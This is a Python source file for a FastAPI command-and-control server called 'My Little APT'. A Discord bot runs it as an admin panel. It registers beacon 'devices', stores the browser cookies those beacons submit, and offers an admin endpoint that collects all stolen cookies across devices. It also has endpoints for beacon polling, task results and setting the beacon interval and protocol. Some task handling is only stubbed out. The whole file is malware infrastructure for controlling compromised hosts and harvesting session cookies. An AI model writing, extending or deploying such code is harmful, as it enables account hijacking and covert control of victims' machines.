"""
C2 Server — FastAPI application.
Acts as the intermediary between the Discord bot (admin panel) and the
future client app (beacon). The bot communicates with the server via
HTTP endpoints.
"""

import logging
from datetime import datetime, timezone

from fastapi import FastAPI, HTTPException, status
from pydantic import BaseModel

from command_handler import CommandHandler
from config import SERVER_HOST, SERVER_PORT, VALID_BEACON_INTERVALS
from models import (
    BeaconCheckIn,
    DeviceInfo,
    TaskResult,
)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("c2-server")

# ---------------------------------------------------------------------------
# Shared instances
# ---------------------------------------------------------------------------

handler = CommandHandler()

# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(
    title="My Little APT — C2 Server",
    description="Command-and-control backend for the my-little-apt project.",
    version="0.2.0",
)


# ---------------------------------------------------------------------------
# Request models for admin endpoints
# ---------------------------------------------------------------------------

class SetBeaconIntervalRequest(BaseModel):
    """Payload for updating the beacon interval."""
    interval: int


class SetProtocolRequest(BaseModel):
    """Payload for updating the communication protocol."""
    protocol: str


# ---------------------------------------------------------------------------
# Health
# ---------------------------------------------------------------------------

@app.get("/health", tags=["health"])
async def health_check() -> dict:
    """Basic health check endpoint."""
    return {
        "status": "healthy",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "config": {
            "beacon_interval": handler.server_config.beacon_interval,
            "communication_protocol": handler.server_config.communication_protocol,
        },
    }


# ---------------------------------------------------------------------------
# Admin endpoints (called by the Discord bot via HTTP)
# ---------------------------------------------------------------------------

@app.get("/admin/devices", tags=["admin"])
async def admin_show_devices() -> dict:
    """Return the list of managed devices."""
    device_list = [
        {
            "name": d.name,
            "ip": d.ip,
            "status": d.status,
            "last_seen": d.last_seen.isoformat(),
        }
        for d in handler.devices.values()
    ]
    return {
        "status": "success",
        "data": {"devices": device_list},
        "message": f"Found {len(device_list)} device(s)",
    }


@app.get("/admin/cookies", tags=["admin"])
async def admin_request_cookies() -> dict:
    """Collect and return cookies from all devices."""
    all_cookies: dict[str, dict[str, str]] = {}
    for device in handler.devices.values():
        if device.cookies:
            all_cookies[device.name] = device.cookies

    total = sum(len(c) for c in all_cookies.values())
    return {
        "status": "success",
        "data": {"cookies_by_device": all_cookies},
        "message": f"Retrieved {total} cookie(s) from {len(all_cookies)} device(s)",
    }


@app.post("/admin/beacon-interval", tags=["admin"])
async def admin_set_beacon_interval(body: SetBeaconIntervalRequest) -> dict:
    """Update the beacon interval."""
    if body.interval not in VALID_BEACON_INTERVALS:
        allowed = ", ".join(str(v) for v in VALID_BEACON_INTERVALS)
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Invalid beacon interval {body.interval}. Allowed: {allowed}",
        )

    handler.server_config.beacon_interval = body.interval
    logger.info("Beacon interval updated to %d seconds", body.interval)
    return {
        "status": "success",
        "data": {"beacon_interval": body.interval},
        "message": f"Beacon interval set to {body.interval} seconds",
    }


@app.post("/admin/communication-protocol", tags=["admin"])
async def admin_set_protocol(body: SetProtocolRequest) -> dict:
    """Update the communication protocol."""
    from config import VALID_COMMUNICATION_PROTOCOLS

    protocol_lower = body.protocol.lower()
    if protocol_lower not in VALID_COMMUNICATION_PROTOCOLS:
        allowed = ", ".join(VALID_COMMUNICATION_PROTOCOLS)
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Invalid protocol '{body.protocol}'. Allowed: {allowed}",
        )

    handler.server_config.communication_protocol = protocol_lower
    logger.info("Communication protocol updated to %s", protocol_lower)
    return {
        "status": "success",
        "data": {"communication_protocol": protocol_lower},
        "message": f"Communication protocol set to {protocol_lower}",
    }


# ---------------------------------------------------------------------------
# Beacon endpoints (for the future app)
# ---------------------------------------------------------------------------

@app.post(
    "/beacon/check-in",
    tags=["beacon"],
    status_code=status.HTTP_200_OK,
)
async def beacon_check_in(payload: BeaconCheckIn) -> dict:
    """
    Beacon registers or updates its presence.
    Returns the current server configuration so the app knows the
    expected interval and protocol.
    """
    device = DeviceInfo(
        name=payload.device_name,
        ip=payload.ip_address,
        os_info=payload.os_info,
        status="online",
        cookies=payload.cookies,
        last_seen=datetime.now(timezone.utc),
    )
    handler.register_device(device)
    return {
        "status": "registered",
        "beacon_interval": handler.server_config.beacon_interval,
        "communication_protocol": handler.server_config.communication_protocol,
    }


@app.get("/beacon/tasks/{device_name}", tags=["beacon"])
async def beacon_get_tasks(device_name: str) -> dict:
    """
    Beacon polls for pending tasks.
    Returns any tasks queued for the requesting device.
    """
    device = handler.get_device(device_name)
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Device '{device_name}' is not registered. "
                   f"Call /beacon/check-in first.",
        )

    # Update last_seen timestamp on poll.
    device.last_seen = datetime.now(timezone.utc)

    return {
        "device": device_name,
        "tasks": [],
        "beacon_interval": handler.server_config.beacon_interval,
    }


@app.post("/beacon/result", tags=["beacon"])
async def beacon_submit_result(result: TaskResult) -> dict:
    """Beacon submits the result of a completed task."""
    device = handler.get_device(result.device_name)
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Device '{result.device_name}' is not registered.",
        )

    logger.info(
        "Task result from %s (task_id=%s, success=%s)",
        result.device_name,
        result.task_id,
        result.success,
    )
    return {"status": "accepted", "task_id": result.task_id}


@app.get("/beacon/config", tags=["beacon"])
async def beacon_get_config() -> dict:
    """Return the current server configuration for beacons."""
    return {
        "beacon_interval": handler.server_config.beacon_interval,
        "communication_protocol": handler.server_config.communication_protocol,
        "valid_intervals": VALID_BEACON_INTERVALS,
    }


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "server:app",
        host=SERVER_HOST,
        port=SERVER_PORT,
        reload=True,
    )
